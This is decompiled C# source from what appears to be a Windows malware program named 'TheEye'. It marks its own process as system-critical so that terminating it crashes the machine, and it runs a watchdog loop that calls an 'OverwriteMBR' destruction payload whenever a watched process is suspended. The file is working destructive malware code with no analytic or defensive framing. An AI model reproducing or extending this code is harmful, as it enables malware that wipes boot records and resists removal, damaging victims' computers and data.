// Decompiled with JetBrains decompiler
// Type: TheEye.Functions
// Assembly: TheEye, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1F112655-6C2B-4871-B1D6-7F6EA80D9DFB
// Assembly location: R:\WinBackup\Downloads\TheEye (Beta) [c0d9d by DesConnet](1)\src\Resources\theeye.exe

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace TheEye
{
  internal class Functions
  {
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtSetInformationProcess(
      IntPtr hProcess,
      int processInformationClass,
      ref int processInformation,
      int processInformationLength);

    public static void SetProcessIsCritical(int isCritical)
    {
      Process.EnterDebugMode();
      Functions.NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref isCritical, 4);
    }

    public static void ProcessShield(string ProcessName)
    {
      while (true)
      {
        Process[] processesByName = Process.GetProcessesByName(ProcessName);
        if (processesByName.Length != 0 && (processesByName[0].Threads[0].ThreadState != System.Diagnostics.ThreadState.Wait ? 0 : (processesByName[0].Threads[0].WaitReason == ThreadWaitReason.Suspended ? 1 : 0)) != 0)
          DestructionPayloads.OverwriteMBR(Vars.BrokeTheRulesMBR, true);
        Thread.Sleep(50);
      }
    }
  }
}
